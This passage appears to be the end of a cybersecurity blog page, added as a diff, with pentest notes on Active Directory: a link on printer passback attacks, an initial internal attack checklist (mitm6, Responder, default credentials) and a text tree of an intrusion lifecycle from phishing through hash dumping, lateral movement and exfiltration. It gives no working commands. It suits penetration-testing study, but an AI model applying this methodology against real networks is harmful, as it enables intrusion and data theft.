+<p>對網路基礎架構、系統和應用程式進行定期安全審核可以幫助在攻擊者利用漏洞之前識別和解決漏洞。組織還應該保持其網路設備和軟體修補並保持最新狀態。</p>
+<h2 id="Passback-Attacks"><a href="#Passback-Attacks" class="headerlink" title="Passback Attacks"></a><strong>Passback Attacks</strong></h2><p>A Pen Tester’s Guide to Printer Hacking - <a target="_blank" rel="noopener" href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/">https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/</a></p>
+<h2 id="Initial-Internal-Attack-Strategy"><a href="#Initial-Internal-Attack-Strategy" class="headerlink" title="Initial Internal Attack Strategy"></a><strong>Initial Internal Attack Strategy</strong></h2><p><img src="/img/ADInitial_Untitled_31.png" alt="Untitled"></p>
+<ul>
+<li>Begin day with mitm6 or Responder</li>
+<li>Run scans to generate traffic</li>
+<li>If scans are taking too long,look for websites in scope (http_version)</li>
+<li>Look for default credentials on web logins<ul>
+<li>Printers</li>
+<li>Jenkins</li>
+<li>Etc</li>
+</ul>
+</li>
+<li>Think outside the box</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└── Initial Reconnaissance</span><br><span class="line">    ├── Identify Targets</span><br><span class="line">    │   ├── Systems</span><br><span class="line">    │   │   ├── Web Servers</span><br><span class="line">    │   │   ├── Database Servers</span><br><span class="line">    │   │   ├── Email Servers</span><br><span class="line">    │   │   └── Employee Workstations</span><br><span class="line">    │   └── People</span><br><span class="line">    │       ├── Key Personnel (e.g., Executives, IT Admins)</span><br><span class="line">    │       ├── Employees with Access to Sensitive Information</span><br><span class="line">    │       └── Employees Active on Social Media</span><br><span class="line">    ├── Determine Attack Methodology</span><br><span class="line">    │   ├── Identify Vulnerable Websites</span><br><span class="line">    │   │   ├── Search <span class="keyword">for</span> Websites with Outdated Software</span><br><span class="line">    │   │   ├── Scan <span class="keyword">for</span> Common Web Application Vulnerabilities (e.g., SQL Injection, XSS)</span><br><span class="line">    │   │   └── Target Specific Web Applications (e.g., CMS, CRM)</span><br><span class="line">    │   ├── Analyze Business Activities</span><br><span class="line">    │   │   ├── Monitor Publicly Available Information (e.g., Press Releases, Financial Reports)</span><br><span class="line">    │   │   └── Identify Potential Points of Exploitation (e.g., Upcoming Mergers)</span><br><span class="line">    │   ├── Understand Internal Organization</span><br><span class="line">    │   │   ├── Gather Employee Information from LinkedIn, Company Websites</span><br><span class="line">    │   │   └── Map Organizational Structure (e.g., Departments, Reporting Lines)</span><br><span class="line">    │   ├── Research Employee Conferences</span><br><span class="line">    │   │   ├── Identify Conferences Relevant to Target Industry</span><br><span class="line">    │   │   └── Gather Information on Attending Employees</span><br><span class="line">    │   └── Browse Social Media</span><br><span class="line">    │       ├── Profile Employees <span class="keyword">for</span> Social Engineering Attacks</span><br><span class="line">    │       ├── Gather Information on Employee Interests, Activities</span><br><span class="line">    │       └── Identify Potential Insider Threats</span><br><span class="line">    └── Conduct Research Activities</span><br><span class="line">        ├── Gather Information from Publicly Available Sources</span><br><span class="line">        ├── Use OSINT Tools (e.g., Shodan, Maltego) to Identify Targets</span><br><span class="line">        └── Analyze Collected Data <span class="keyword">for</span> Attack Surface Expansion</span><br><span class="line"></span><br><span class="line">└── Initial Compromise</span><br><span class="line">    └── Execute Malicious Code</span><br><span class="line">        ├── Social Engineering</span><br><span class="line">        │   ├── Craft Spear Phishing Emails Impersonating Trusted Entities</span><br><span class="line">        │   ├── Attach Malicious Documents/Links to Emails</span><br><span class="line">        │   └── Exploit Psychological Manipulation Techniques</span><br><span class="line">        ├── Exploit Vulnerability</span><br><span class="line">        │   ├── Exploit Known Vulnerabilities <span class="keyword">in</span> Internet-facing Systems (e.g., CVEs)</span><br><span class="line">        │   ├── Target Zero-Day Vulnerabilities</span><br><span class="line">        │   └── Utilize Exploit Kits (e.g., Metasploit) <span class="keyword">for</span> Automated Attacks</span><br><span class="line">        └── Other Means</span><br><span class="line">            ├── Physical Access Exploitation (e.g., USB Drop Attacks)</span><br><span class="line">            ├── Supply Chain Attacks (e.g., Compromised Software Updates)</span><br><span class="line">            └── Insider Collusion (e.g., Bribery, Coercion)</span><br><span class="line"></span><br><span class="line">└── Establish Foothold</span><br><span class="line">    └── Install Persistent Backdoor</span><br><span class="line">        ├── Plant Rootkits <span class="keyword">in</span> System Firmware</span><br><span class="line">        ├── Hide Malicious Processes via Process Injection Techniques</span><br><span class="line">        └── Create Scheduled Tasks <span class="keyword">for</span> Stealthy Execution</span><br><span class="line">    └── Download Additional Malware</span><br><span class="line">        ├── Fetch Remote Payloads from C&amp;C Servers</span><br><span class="line">        ├── Install Remote Access Trojans (RATs) <span class="keyword">for</span> Control</span><br><span class="line">        └── Deploy Keyloggers <span class="keyword">for</span> Credential Harvesting</span><br><span class="line">    └── Maintain Control</span><br><span class="line">        ├── Evade Detection with Anti-Forensic Techniques</span><br><span class="line">        ├── Implement Traffic Encryption to Avoid IDS/IPS Detection</span><br><span class="line">        └── Continuously Monitor System Activity <span class="keyword">for</span> Anomalies</span><br><span class="line"></span><br><span class="line">└── Escalate Privileges</span><br><span class="line">    └── Obtain Greater Access</span><br><span class="line">        ├── Password Hash Dumping</span><br><span class="line">        │   ├── Exploit Vulnerable Services <span class="keyword">for</span> Hash Retrieval</span><br><span class="line">        │   ├── Utilize Tools like Mimikatz <span class="keyword">for</span> Dumping LSASS Memory</span><br><span class="line">        │   └── Extract Hashes from Local SAM Database</span><br><span class="line">        ├── Keystroke/Credential Logging</span><br><span class="line">        │   ├── Deploy Keyloggers at System Level</span><br><span class="line">        │   └── Intercept User Credentials during Authentication</span><br><span class="line">        └── Exploiting Vulnerable Software</span><br><span class="line">            ├── Exploit Privilege Escalation Vulnerabilities (e.g., Windows UAC Bypass)</span><br><span class="line">            ├── Abuse Misconfigured Services <span class="keyword">for</span> Elevated Access</span><br><span class="line">            └── Hijack Privileged Processes (e.g., DLL Injection)</span><br><span class="line"></span><br><span class="line">└── Internal Reconnaissance</span><br><span class="line">    └── Explore Victim<span class="string">&#x27;s Environment</span></span><br><span class="line"><span class="string">        ├── Understand Environment</span></span><br><span class="line"><span class="string">        │   ├── Enumerate Network Topology</span></span><br><span class="line"><span class="string">        │   ├── Identify Active Directory Structure</span></span><br><span class="line"><span class="string">        │   └── Map Internal Services (e.g., File Shares, Databases)</span></span><br><span class="line"><span class="string">        ├── Identify Key Individuals</span></span><br><span class="line"><span class="string">        │   ├── Identify Domain Admins and Power Users</span></span><br><span class="line"><span class="string">        │   ├── Profile Employees with Access to Sensitive Data</span></span><br><span class="line"><span class="string">        │   └── Determine Employee Roles and Responsibilities</span></span><br><span class="line"><span class="string">        └── Determine Information Locations</span></span><br><span class="line"><span class="string">            ├── Identify High-Value Data Repositories</span></span><br><span class="line"><span class="string">            ├── Analyze File System Permissions</span></span><br><span class="line"><span class="string">            └── Enumerate Database Contents for Valuable Information</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Move Laterally</span></span><br><span class="line"><span class="string">    └── Access Network Shares</span></span><br><span class="line"><span class="string">        ├── Exploit Weak SMB/CIFS Permissions</span></span><br><span class="line"><span class="string">        ├── Utilize Pass-the-Hash Attacks for Authentication</span></span><br><span class="line"><span class="string">        └── Transfer Malicious Payloads via Shared Folders</span></span><br><span class="line"><span class="string">    └── Execute Programs via Task Scheduler</span></span><br><span class="line"><span class="string">        ├── Abuse Scheduled Tasks for Code Execution</span></span><br><span class="line"><span class="string">        └── Schedule Stealthy Malware Execution for Persistence</span></span><br><span class="line"><span class="string">    └── Use Remote Access Tools</span></span><br><span class="line"><span class="string">        ├── PsExec</span></span><br><span class="line"><span class="string">        │   ├── Execute Commands Remotely on Target Systems</span></span><br><span class="line"><span class="string">        │   └── Bypass UAC Restrictions for Admin Access</span></span><br><span class="line"><span class="string">        ├── RDP</span></span><br><span class="line"><span class="string">        │   ├── Remotely Control Systems with RDP Protocol</span></span><br><span class="line"><span class="string">        │   └── Exploit Weak RDP Credentials for Access</span></span><br><span class="line"><span class="string">        └── VNC</span></span><br><span class="line"><span class="string">            ├── Establish Remote Desktop Sessions for Control</span></span><br><span class="line"><span class="string">            └── Exploit VNC Authentication Weaknesses</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Maintain Presence</span></span><br><span class="line"><span class="string">    └── Install Malware Backdoors</span></span><br><span class="line"><span class="string">        ├── Deploy Reverse Shells for Persistent Access</span></span><br><span class="line"><span class="string">        ├── Implement RATs for Remote Control</span></span><br><span class="line"><span class="string">        └── Establish VPN Tunnels for Stealthy Communication</span></span><br><span class="line"><span class="string">    └── Gain Access to Remote Access Services</span></span><br><span class="line"><span class="string">        ├── Compromise Corporate VPNs with Stolen Credentials</span></span><br><span class="line"><span class="string">        └── Exploit Weaknesses in Remote Desktop Services for Access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Complete Mission</span></span><br><span class="line"><span class="string">    └── Accomplish Goal</span></span><br><span class="line"><span class="string">        ├── Steal Information</span></span><br><span class="line"><span class="string">        │   ├── Exfiltrate Data via Encrypted Channels</span></span><br><span class="line"><span class="string">        │   ├── Harvest Financial Documents, Intellectual Property, PII</span></span><br><span class="line"><span class="string">        │   └── Cover Tracks to Avoid Detection</span></span><br><span class="line"><span class="string">        └── Maintain Access</span></span><br><span class="line"><span class="string">            ├── Establish Secondary Backdoors for Future Access</span></span><br><span class="line"><span class="string">            └── Leave Traces for Reconnaissance on Next Target</span></span><br></pre></td></tr></table></figure>
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
